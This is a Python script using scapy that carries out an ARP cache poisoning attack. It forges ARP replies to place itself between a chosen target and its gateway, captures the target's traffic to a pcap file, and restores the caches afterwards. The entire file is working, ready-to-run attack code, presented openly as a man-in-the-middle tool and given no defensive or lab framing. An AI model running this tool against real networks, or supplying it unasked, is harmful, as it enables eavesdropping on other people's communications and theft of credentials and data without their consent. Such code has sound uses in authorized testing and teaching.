#!/usr/bin/env python3

import argparse

from scapy.all import *
from scapy.layers.l2 import ARP, Ether

parser = argparse.ArgumentParser(sys.argv[0])
parser.add_argument('-i', '--interface', type=str, dest='interface', default='eth0',
                    help='interface to use')
parser.add_argument('-g', '--gateway', type=str, dest='gateway', help='gateway address')
parser.add_argument('-t', '--target', type=str, dest='target', help='interface to use')
parser.add_argument('-c', '--count', type=int, dest='count', default=1000,
                    help='number of packets to send, 0 means send forever')
parser.add_argument('-f', '--filename', type=str, dest='filename', default='arper.pcap', help='filename to save pcap')

parser.description = """\
This is a Python program to perform an arp cache poisoning attack, 
and then intercept traffic as MITM (Man In The Middle).
"""
args = parser.parse_args()


def get_mac(ip):
    '''

    :param ip: ipaddress
    :return: mac or None
    '''
    # normal lookup - "who has IP X" to Ethernet broadcast address and store replies
    responses, unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=2, retry=10, verbose=False)

    # hand back the mac
    for s, r in responses:
        return r[Ether].src
    return None


def poison_target(gw_ip, gw_mac, tgt_ip, tgt_mac):
    '''
    perform arp poison attack
    :param gw_ip: gateway ip addrss
    :param gw_mac: gateway mac address
    :param tgt_ip: target ip address
    :param tgt_mac: target mac address
    :return: None => Intentional infinite loop unless interrupt
    '''

    print(f'Poisoning target: {tgt_ip} in background')
    p_target = ARP(op=2,
                        psrc=gw_ip,
                        pdst=tgt_ip,
                        hwdst=tgt_mac)

    p_gateway = ARP(op=2,
                        psrc=tgt_ip,
                        pdst=gw_ip,
                        hwdst=gw_mac)

    while True:
        try:
            sendp(p_gateway,verbose=False)
            sendp(p_target, verbose=False)

            time.sleep(2)

        except KeyboardInterrupt:
            restore_target(gw_ip, gw_mac, tgt_ip, tgt_mac)
            sys.exit(0)


def restore_target(gw_ip, gw_mac, tgt_ip, tgt_mac):
    '''
    inverse of poison_attack, restore original addrs after attack
    :param gw_ip:
    :param gw_mac:
    :param tgt_ip:
    :param tgt_mac:
    :return:
    '''
    print(f'Restoring target: {args.target}')
    sendp(ARP(op=2, psrc=gw_ip, pdst=tgt_ip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=gw_mac), count=5, verbose=False)
    sendp(ARP(op=2, psrc=tgt_ip, pdst=gw_ip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=tgt_mac), count=5, verbose=False)


def main():
    print(f'Setting up to sniff on interface: {args.interface}')

    # gather real mac addresses via ARP
    print(f'Getting MAC addr for gateway: {args.gateway}')
    gateway_mac = get_mac(args.gateway)
    if gateway_mac is None:
        print(f'Failed to get MAC addr for gateway: {args.gateway}')
        sys.exit(1)
    else:
        print(f'Gateway: {args.gateway} is at: {gateway_mac}')

    print(f'Getting MAC addr for target: {args.target}')
    target_mac = get_mac(args.target)
    if target_mac is None:
        print(f'Failed to get MAC addr for target: {args.target}')
        sys.exit(1)
    else:
        print(f'Target: {args.target} is at: {target_mac}')

    # spawn thread to run poison part of attack (send malicious gratuitous ARP to poison ARP cache with OUR mac)
    poison_thread = threading.Thread(target=poison_target, args=(args.gateway, gateway_mac, args.target, target_mac),
                                     daemon=True)
    poison_thread.start()

    try:
        print(f'Starting sniffer for {args.count} packets')

        bpf_filter = f'ip host {args.target}'
        packets = sniff(filter=bpf_filter, count=args.count, iface=args.interface)

        # write out a pcap
        wrpcap(args.filename, packets)

        # restore the network
        restore_target(args.gateway, gateway_mac, args.target, target_mac)
        print(f'Completed attack on:  {args.target} results stored in: {args.filename}')

    except KeyboardInterrupt:
        restore_target(args.gateway, gateway_mac, args.target, target_mac)
        sys.exit(0)


if __name__ == '__main__':
    main()
